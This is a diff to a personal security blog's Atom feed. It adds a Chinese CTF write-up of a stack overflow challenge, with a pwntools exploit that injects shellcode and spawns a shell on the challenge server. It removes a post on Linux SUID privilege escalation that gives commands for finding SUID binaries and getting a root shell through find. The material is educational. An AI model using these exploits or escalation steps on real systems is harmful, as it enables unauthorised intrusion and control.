@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://coldwave96.github.io/"/>
-  <updated>2020-05-06T07:42:07.833Z</updated>
+  <updated>2020-05-07T06:25:46.548Z</updated>
   <id>https://coldwave96.github.io/</id>
   
   <author>
@@ -15,6 +15,29 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>XMAN-level1 の Write-Up</title>
+    <link href="https://coldwave96.github.io/2020/05/07/XMAN-level1/"/>
+    <id>https://coldwave96.github.io/2020/05/07/XMAN-level1/</id>
+    <published>2020-05-07T06:10:04.000Z</published>
+    <updated>2020-05-07T06:25:46.548Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Foreword"><a href="#Foreword" class="headerlink" title="Foreword"></a>Foreword</h2><p>&emsp;&emsp;这是JarvisOJ的PWN题部分[XMAN]level1的Write-Up，比较简单。关键点在于当程序中没有现成的shellcode时，如何建立自己的shellcode并在buffer上布局。</p><a id="more"></a><h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>&emsp;&emsp;程序运行如下图所示，可见会显示一个奇怪的地址：</p><p><img src="/img/XMAN-level1/XMAN1.png" alt=""></p><p>&emsp;&emsp;还是一样的套路，checksec：32位程序，没有什么特殊的保护措施，并且栈上存在可读可写可执行的部分：</p><p><img src="/img/XMAN-level1/XMAN2.png" alt=""></p><h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p>&emsp;&emsp;将程序拖到hopper disassembler中，熟悉的vulnerable_function函数：</p><p><img src="/img/XMAN-level1/XMAN3.png" alt="main函数"></p><p><img src="/img/XMAN-level1/XMAN4.png" alt="vulnerable_function函数"></p><p>&emsp;&emsp;通过vulnerable_function函数的伪C代码可以明白之前出现的那个奇怪的地址其实是泄露的buf地址，那么我们就应该有思路了：</p><p><img src="/img/XMAN-level1/XMAN5.png" alt=""></p><p>&emsp;&emsp;首先左边是正常情况下栈中的布局情况，我们已知的是buf的起始地址。那么我们要做的是将ret的返回地址覆盖为buf的起始地址，这样我们就可以在buf中布局我们的shellcode。</p><p>&emsp;&emsp;右边是理想情况下我们布局后的栈中情况。</p><h2 id="Step-2-1"><a href="#Step-2-1" class="headerlink" title="Step 2"></a>Step 2</h2><p>&emsp;&emsp;找到思路，下面就是EXP的编写了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">'pwn2.jarvisoj.com'</span>, <span class="number">9877</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh = process('./level1')</span></span><br><span class="line"><span class="comment"># elf = ELF('./level1')</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取buf地址</span></span><br><span class="line">buf = sh.recvline()[<span class="number">14</span>:<span class="number">22</span>]</span><br><span class="line"><span class="comment"># 将16进制地址字符串转换成十进制的地址</span></span><br><span class="line">buf_addr = int(buf, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成shellcode</span></span><br><span class="line">shellcode = asm(shellcraft.i386.linux.sh())</span><br><span class="line"></span><br><span class="line">payload = shellcode + <span class="string">"A"</span> * (<span class="number">0x88</span> + <span class="number">0x4</span> -len(shellcode)) + p32(buf_addr)</span><br><span class="line"></span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line">sh.close()</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;执行后就可以拿到shell啦：</p><p><img src="/img/XMAN-level1/XMAN6.png" alt=""></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;Foreword&quot;&gt;&lt;a href=&quot;#Foreword&quot; class=&quot;headerlink&quot; title=&quot;Foreword&quot;&gt;&lt;/a&gt;Foreword&lt;/h2&gt;&lt;p&gt;&amp;emsp;&amp;emsp;这是JarvisOJ的PWN题部分[XMAN]level1的Write-Up，比较简单。关键点在于当程序中没有现成的shellcode时，如何建立自己的shellcode并在buffer上布局。&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="WriteUPs" scheme="https://coldwave96.github.io/categories/WriteUPs/"/>
+    
+    
+      <category term="PWN" scheme="https://coldwave96.github.io/tags/PWN/"/>
+    
+  </entry>
   
   <entry>
     <title>Vulnhub - DC-4 の Write-Up</title>
@@ -465,41 +488,6 @@
     
     
       <category term="Vulnhub" scheme="https://coldwave96.github.io/tags/Vulnhub/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Linux的SUID提权</title>
-    <link href="https://coldwave96.github.io/2019/11/15/suid/"/>
-    <id>https://coldwave96.github.io/2019/11/15/suid/</id>
-    <published>2019-11-15T03:15:40.000Z</published>
-    <updated>2020-04-30T10:46:04.999Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>&emsp;&emsp;SUID是set uid的简称，它出现在文件所属主权限的执行位上面，标志为 s 。当设置了SUID后，UMSK第一位为4。我们知道，我们账户的密码文件存放在/etc/shadow中，而/etc/shadow的权限为 ———-。也就是说：只有root用户可以对该目录进行操作，而其他用户连查看的权限都没有。当普通用户要修改自己的密码的时候，可以使用passwd这个指令。passwd这个指令在/bin/passwd下，当我们执行这个命令后，就可以修改/etc/shadow下的密码了。那么为什么我们可以通过passwd这个指令去修改一个我们没有权限的文件呢？这里就用到了suid，suid的作用是让执行该命令的用户以该命令拥有者即root的权限去执行，意思是当普通用户执行passwd时会拥有root的权限，这样就可以修改/etc/passwd这个文件了。(命令：<code>chmod u+s  文件名</code>)</p><p><img src="/img/suid/suid1.png" alt=""></p><p>&emsp;&emsp;使用suid需要满足的几个条件:</p><ul><li><p>SUID只对可执行文件有效</p></li><li><p>调用者对该文件有执行权</p></li><li><p>在执行过程中，调用者会暂时获得该文件的所有者权限</p></li><li><p>该权限只在程序执行的过程中有效</p></li></ul><a id="more"></a><h2 id="发现"><a href="#发现" class="headerlink" title="发现"></a>发现</h2><p>&emsp;&emsp;已知的可用来提权的linux可行性的文件列表如下：</p><ul><li><p>nmap</p></li><li><p>vim</p></li><li><p>find</p></li><li><p>bash</p></li><li><p>more</p></li><li><p>less</p></li><li><p>nano</p></li><li><p>cp</p></li></ul><p>&emsp;&emsp;以下命令可以发现系统上运行的所有SUID可执行文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#以下命令将尝试查找具有root权限的SUID的文件，不同系统适用于不同的命令，一个一个试</span></span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000-print2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000-exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure><h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><p>&emsp;&emsp;假设我们已经获得了某台服务器的shell，但是账户权限比较低。</p><p><img src="/img/suid/suid2.png" alt=""></p><p>&emsp;&emsp;使用命令<code>find / -perm -u=s -type f 2&gt;/dev/null</code>寻找满足提权条件的可执行文件，本次实验使用find。</p><p><img src="/img/suid/suid3.png" alt=""></p><p>&emsp;&emsp;执行命令<code>find flag4.txt -exec /bin/sh \;</code>，实现提权。</p><p><img src="/img/suid/suid4.png" alt=""></p><p>&emsp;&emsp;可以继续执行反弹shell的命令，最后反弹回来的shell也会是root权限，这里就不做演示了。</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;&amp;emsp;&amp;emsp;SUID是set uid的简称，它出现在文件所属主权限的执行位上面，标志为 s 。当设置了SUID后，UMSK第一位为4。我们知道，我们账户的密码文件存放在/etc/shadow中，而/etc/shadow的权限为 ———-。也就是说：只有root用户可以对该目录进行操作，而其他用户连查看的权限都没有。当普通用户要修改自己的密码的时候，可以使用passwd这个指令。passwd这个指令在/bin/passwd下，当我们执行这个命令后，就可以修改/etc/shadow下的密码了。那么为什么我们可以通过passwd这个指令去修改一个我们没有权限的文件呢？这里就用到了suid，suid的作用是让执行该命令的用户以该命令拥有者即root的权限去执行，意思是当普通用户执行passwd时会拥有root的权限，这样就可以修改/etc/passwd这个文件了。(命令：&lt;code&gt;chmod u+s  文件名&lt;/code&gt;)&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;/img/suid/suid1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
-&lt;p&gt;&amp;emsp;&amp;emsp;使用suid需要满足的几个条件:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;p&gt;SUID只对可执行文件有效&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;p&gt;调用者对该文件有执行权&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;p&gt;在执行过程中，调用者会暂时获得该文件的所有者权限&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;p&gt;该权限只在程序执行的过程中有效&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-    
-    </summary>
-    
-    
-      <category term="Penetration testing" scheme="https://coldwave96.github.io/categories/Penetration-testing/"/>
-    
-    
-      <category term="Strategy" scheme="https://coldwave96.github.io/tags/Strategy/"/>
     
   </entry>
   
